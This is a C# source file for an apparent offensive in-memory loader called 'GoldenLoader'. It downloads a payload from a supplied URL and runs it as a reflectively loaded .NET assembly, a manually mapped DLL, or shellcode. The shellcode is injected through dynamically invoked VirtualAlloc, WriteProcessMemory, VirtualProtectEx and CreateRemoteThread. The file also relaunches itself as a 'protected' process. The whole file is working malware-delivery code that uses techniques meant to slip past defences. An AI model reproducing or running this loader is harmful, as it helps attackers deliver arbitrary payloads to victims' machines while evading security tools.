using System;
using System.IO;
using System.Reflection;
using DInvoke.DynamicInvoke;
using DInvoke.Data;
using DInvoke.ManualMap;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace GoldenLoader
{
    public class Manager
    {

        public void createProcess(string url, string type, string arguments, string method)
        {
            string codeBase = Assembly.GetExecutingAssembly().CodeBase;
            UriBuilder uri = new UriBuilder(codeBase);
            string path = Uri.UnescapeDataString(uri.Path);
            var assemblyName = Path.GetDirectoryName(path) + "\\" + Assembly.GetExecutingAssembly().GetName().Name + ".exe";
            var cmd = assemblyName + " execute -u " + url + " -t " + type;

            if(arguments != "")
                cmd += " -p \"" + arguments + "\"";
            if (method != "")
                cmd += " -m " + method;

            Creator.createProtectedProcess(cmd);
        }

        public void downloadAndExecute(string url, string type, string arguments, string method)
        {
            byte[] PE = new System.Net.WebClient().DownloadData(url);

            switch (type)
            {
                case "managed":
                    loadManagedDll(PE, arguments, method);
                    break;
                case "unmanaged":
                    loadUnmanagedDLL(PE);
                    break;
                case "shellcode":
                    loadShellcode(PE);
                    break;
                default:
                    Console.WriteLine("Unknown type. Exiting...");
                    break;
            }

        }

        private void loadUnmanagedDLL(byte[] pE)
        {
            PE.PE_MANUAL_MAP moduleDetails = Map.MapModuleToMemory(pE);
            var main = new object[]
            {
                IntPtr.Zero,
                (uint)0,
                IntPtr.Zero
            };

            Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "DllMain",
                                              typeof(DllMain), main);
        }

        private unsafe void loadShellcode(byte[] sc)
        {

            var handle = Process.GetCurrentProcess().Handle;
            var baseAddress = IntPtr.Zero;

            var allocate = new object[]
            {
                    IntPtr.Zero,
                    (UIntPtr)(sc.Length + 1),
                    DInvoke.Data.Win32.Kernel32.MemoryAllocationFlags.Reserve | DInvoke.Data.Win32.Kernel32.MemoryAllocationFlags.Commit,
                    DInvoke.Data.Win32.Kernel32.MemoryProtectionFlags.ReadWrite
            };


            baseAddress = (IntPtr)Generic.DynamicAPIInvoke(
                "kernel32.dll",
                "VirtualAlloc",
                typeof(DInvoke.DynamicInvoke.Win32.Delegates.VirtualAlloc),
                ref allocate,
                true);


            if (baseAddress == IntPtr.Zero)
                return;

            var write = new object[] {
                handle,
                baseAddress,
                sc,
                (sc.Length + 1),
                IntPtr.Zero
            };

            var ret = (bool)Generic.DynamicAPIInvoke(
                "kernel32.dll",
                "WriteProcessMemory",
                typeof(DInvoke.DynamicInvoke.Win32.Delegates.WriteProcessMemory),
                ref write,
                true); 


            if (!ret)
                return;

            uint oldProtection = 0;
            var protection = new object[] {
                (IntPtr)(-1),
                baseAddress,
                (UIntPtr)(sc.Length + 1),
                (uint)DInvoke.Data.Win32.Kernel32.MemoryProtectionFlags.ExecuteRead,
                oldProtection
            };

            var response = (IntPtr)Generic.DynamicAPIInvoke(
                "kernel32.dll",
                "VirtualProtectEx",
                typeof(DInvoke.DynamicInvoke.Win32.Delegates.VirtualProtectEx),
                ref protection,
                true); 

            if (response == IntPtr.Zero)
                return;


            var createThreat = new object[]
            {
                (IntPtr)(-1),
                IntPtr.Zero,
                (uint)0,
                baseAddress,
                IntPtr.Zero,
                (uint)0,
                IntPtr.Zero
            };

            var hthread = (IntPtr)Generic.DynamicAPIInvoke(
                "kernel32.dll",
                "CreateRemoteThread",
                typeof(DInvoke.DynamicInvoke.Win32.Delegates.CreateRemoteThread),
                ref createThreat,
                true); 
        }

        private void loadManagedDll(byte[] pE, string arguments, string m)
        {
            Assembly assembly = Assembly.Load(pE);
            string[] parameters = new string[] { arguments };

            if (m == "")
            {
                //Find the Entrypoint or "Main" method
                MethodInfo method = assembly.EntryPoint;
                method.Invoke(null, new object[] { parameters });

            }
            else
            {
                MethodInfo method = null;
                Type myType = null;
                foreach (var type in assembly.GetTypes())
                {

                    method = type.GetMethod(m);
                    if (method != null)
                    {
                        myType = type;
                        break;
                    }
                }

                if (method != null && myType != null)
                {
                    var myInstance = Activator.CreateInstance(myType);
                    method.Invoke(myInstance, new object[] { parameters });
                }
            }

        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int DllMain(IntPtr hModule, uint ul, IntPtr lpReserved);
    }
}